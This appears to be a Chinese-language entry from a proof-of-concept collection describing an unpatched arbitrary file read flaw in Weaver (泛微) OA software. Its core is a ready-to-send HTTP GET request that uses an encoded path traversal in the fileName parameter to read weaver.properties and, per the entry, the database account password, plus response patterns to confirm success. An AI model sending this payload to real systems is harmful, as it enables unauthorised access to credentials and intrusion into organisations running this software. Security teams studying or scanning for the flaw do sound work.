﻿# 泛微 0day 任意文件读取

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：泛微 0day 任意文件读取 可直接读取数据库账号密码

> 漏洞特征：

> 验证脚本：HTTP

```
GET /api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?ecology)(?=.*?password)(?=.*?charset).*?$

> 上传文件定位：

> 验证文件来源：泛微 OA 0day 任意文件读取.poc
